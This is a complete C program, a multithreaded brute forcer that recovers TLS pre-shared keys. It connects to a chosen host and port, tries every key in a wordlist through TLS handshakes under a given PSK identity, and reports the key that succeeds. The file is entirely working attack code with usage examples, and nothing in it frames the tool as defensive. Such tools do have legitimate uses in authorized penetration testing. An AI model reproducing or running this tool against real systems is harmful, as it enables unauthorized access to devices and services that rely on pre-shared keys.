/* tls-psk brute forcer */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <signal.h>
#include <time.h>

#define MAX_PSK_LEN 256
#define MAX_LINE_LEN 1024
#define DEFAULT_IDENTITY "client1"

typedef struct {
    char *host;
    char *sni;
    int port;
    char *identity;
    int thread_count;
    char *wordlist;
    FILE *wordlist_fp;
    pthread_mutex_t *mutex;
    int *found;
    char *found_psk;
    int *attempts;
    int *active_threads;
    time_t *start_time;
} config_t;

typedef struct {
    int thread_id;
    config_t *config;
} thread_data_t;

// Global for signal handling
volatile sig_atomic_t running = 1;

void signal_handler(int sig) {
    running = 0;
    printf("\n");
}

// PSK client callback
unsigned int psk_client_callback(SSL *ssl, const char *hint,
                                char *identity, unsigned int max_identity_len,
                                unsigned char *psk, unsigned int max_psk_len) {
    // Get PSK from SSL object's ex_data
    char *test_psk = (char *)SSL_get_ex_data(ssl, 0);
    char *test_identity = (char *)SSL_get_ex_data(ssl, 1);
    
    if (!test_psk || !test_identity) {
        return 0;
    }
    
    size_t psk_len = strlen(test_psk);
    size_t id_len = strlen(test_identity);
    
    if (psk_len > max_psk_len || id_len >= max_identity_len) {
        return 0;
    }
    
    strcpy(identity, test_identity);
    memcpy(psk, test_psk, psk_len);
    
    return psk_len;
}

int test_psk(config_t *config, const char *psk) {
    SSL_CTX *ctx = NULL;
    SSL *ssl = NULL;
    int sockfd = -1;
    int ret = 0;
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return 0;
    }
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    // Resolve host
    struct hostent *server = gethostbyname(config->host);
    if (!server) {
        close(sockfd);
        return 0;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
    addr.sin_port = htons(config->port);
    
    // Connect
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        return 0;
    }
    
    // Create SSL context
    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        close(sockfd);
        return 0;
    }
    
    // Set PSK callback
    SSL_CTX_set_psk_client_callback(ctx, psk_client_callback);
    
    // Create SSL object
    ssl = SSL_new(ctx);
    if (!ssl) {
        SSL_CTX_free(ctx);
        close(sockfd);
        return 0;
    }
    
    // Store PSK and identity in SSL object for callback
    SSL_set_ex_data(ssl, 0, (void *)psk);
    SSL_set_ex_data(ssl, 1, (void *)config->identity);
    
    // Set SNI if provided
    if (config->sni) {
        SSL_set_tlsext_host_name(ssl, config->sni);
    }
    
    // Set socket
    SSL_set_fd(ssl, sockfd);
    
    // Attempt handshake
    ret = SSL_connect(ssl);
    if (ret > 0) {
        // Success!
        ret = 1;
    } else {
        ret = 0;
    }
    
    // Cleanup
    if (ssl) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
    }
    if (ctx) {
        SSL_CTX_free(ctx);
    }
    if (sockfd >= 0) {
        close(sockfd);
    }
    
    return ret;
}

void *brute_force_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    config_t *config = data->config;
    char line[MAX_LINE_LEN];
    
    while (running && !(*config->found)) {
        pthread_mutex_lock(config->mutex);
        if (fgets(line, sizeof(line), config->wordlist_fp) == NULL) {
            pthread_mutex_unlock(config->mutex);
            break;
        }
        (*config->attempts)++;
        pthread_mutex_unlock(config->mutex);
        
        // Remove newline
        size_t len = strlen(line);
        if (len > 0 && line[len-1] == '\n') {
            line[len-1] = '\0';
        }
        
        // Skip empty lines
        if (strlen(line) == 0) {
            continue;
        }
        
        if (data->thread_id == 0 && (*config->attempts) % 10 == 0) {
            time_t elapsed = time(NULL) - *config->start_time;
            if (elapsed > 0) {
                printf("\r[%d/%ld sec] %.1f/s trying: %s", 
                       *config->attempts, elapsed, 
                       (float)*config->attempts / elapsed, line);
                fflush(stdout);
            }
        }
        
        if (test_psk(config, line)) {
            pthread_mutex_lock(config->mutex);
            if (!(*config->found)) {
                *config->found = 1;
                strcpy(config->found_psk, line);
                printf("\n[+] found it: %s\n", line);
            }
            pthread_mutex_unlock(config->mutex);
            break;
        }
        
        usleep(10000);
    }
    
    pthread_mutex_lock(config->mutex);
    (*config->active_threads)--;
    pthread_mutex_unlock(config->mutex);
    
    free(data);
    return NULL;
}

void print_usage(const char *prog) {
    printf("Usage: %s -t [sni@]host:port -i identity [-T threads] wordlist\n", prog);
    printf("\nOptions:\n");
    printf("  -t [sni@]host:port  Target host and port (SNI optional)\n");
    printf("  -i identity         PSK identity (required)\n");
    printf("  -T threads          Number of threads (default: 1)\n");
    printf("  -h                  Show this help\n");
    printf("\nExamples:\n");
    printf("  %s -t localhost:4433 -i client1 wordlist.txt\n", prog);
    printf("  %s -t example.com@10.0.0.1:443 -i device1 -T 10 wordlist.txt\n", prog);
}

int parse_target(char *target, config_t *config) {
    char *at = strchr(target, '@');
    char *colon;
    
    if (at) {
        // SNI@host:port format
        *at = '\0';
        config->sni = strdup(target);
        target = at + 1;
    }
    
    colon = strrchr(target, ':');
    if (!colon) {
        fprintf(stderr, "Error: Invalid target format (missing port)\n");
        return -1;
    }
    
    *colon = '\0';
    config->host = strdup(target);
    config->port = atoi(colon + 1);
    
    if (config->port <= 0 || config->port > 65535) {
        fprintf(stderr, "Error: Invalid port number\n");
        return -1;
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    config_t config = {0};
    pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
    int found = 0;
    char found_psk[MAX_PSK_LEN] = {0};
    int attempts = 0;
    int active_threads = 0;
    time_t start_time;
    int opt;
    
    // Default values
    config.thread_count = 1;
    config.identity = NULL;  // Make it mandatory
    config.mutex = &mutex;
    config.found = &found;
    config.found_psk = found_psk;
    config.attempts = &attempts;
    config.active_threads = &active_threads;
    config.start_time = &start_time;
    
    // Parse arguments
    while ((opt = getopt(argc, argv, "t:T:i:h")) != -1) {
        switch (opt) {
            case 't':
                if (parse_target(optarg, &config) < 0) {
                    return 1;
                }
                break;
            case 'T':
                config.thread_count = atoi(optarg);
                if (config.thread_count < 1 || config.thread_count > 100) {
                    fprintf(stderr, "Error: Thread count must be between 1 and 100\n");
                    return 1;
                }
                break;
            case 'i':
                config.identity = optarg;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    if (!config.host || !config.identity || optind >= argc) {
        if (!config.host) fprintf(stderr, "Error: Target (-t) is required\n");
        if (!config.identity) fprintf(stderr, "Error: Identity (-i) is required\n");
        if (optind >= argc) fprintf(stderr, "Error: Wordlist is required\n");
        print_usage(argv[0]);
        return 1;
    }
    
    config.wordlist = argv[optind];
    
    // Open wordlist
    config.wordlist_fp = fopen(config.wordlist, "r");
    if (!config.wordlist_fp) {
        fprintf(stderr, "Error: Cannot open wordlist file '%s'\n", config.wordlist);
        return 1;
    }
    
    // Initialize OpenSSL
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    // Setup signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Count lines in wordlist
    int line_count = 0;
    char line[256];
    while (fgets(line, sizeof(line), config.wordlist_fp)) line_count++;
    rewind(config.wordlist_fp);
    
    printf("tls-psk bruteforce v1.0\n\n");
    
    printf("target: %s:%d\n", config.host, config.port);
    if (config.sni) printf("sni: %s\n", config.sni);
    printf("identity: %s\n", config.identity);
    printf("threads: %d\n", config.thread_count);
    printf("wordlist: %s (%d entries)\n\n", config.wordlist, line_count);
    
    start_time = time(NULL);
    active_threads = config.thread_count;
    
    // Create threads
    pthread_t *threads = malloc(config.thread_count * sizeof(pthread_t));
    for (int i = 0; i < config.thread_count; i++) {
        thread_data_t *data = malloc(sizeof(thread_data_t));
        data->thread_id = i;
        data->config = &config;
        
        if (pthread_create(&threads[i], NULL, brute_force_thread, data) != 0) {
            fprintf(stderr, "Error: Failed to create thread %d\n", i);
            active_threads--;
        }
    }
    
    // Wait for threads to complete
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    time_t elapsed = time(NULL) - start_time;
    printf("\n\ndone. %d/%d tries in %ld sec", attempts, line_count, elapsed);
    if (elapsed > 0) {
        printf(" (%.1f/s avg)", (float)attempts / elapsed);
    }
    printf("\n");
    
    if (found) {
        printf("psk: %s\n", found_psk);
    } else {
        printf("not found\n");
    }
    
    // Cleanup
    free(threads);
    fclose(config.wordlist_fp);
    if (config.host) free(config.host);
    if (config.sni) free(config.sni);
    
    return found ? 0 : 1;
}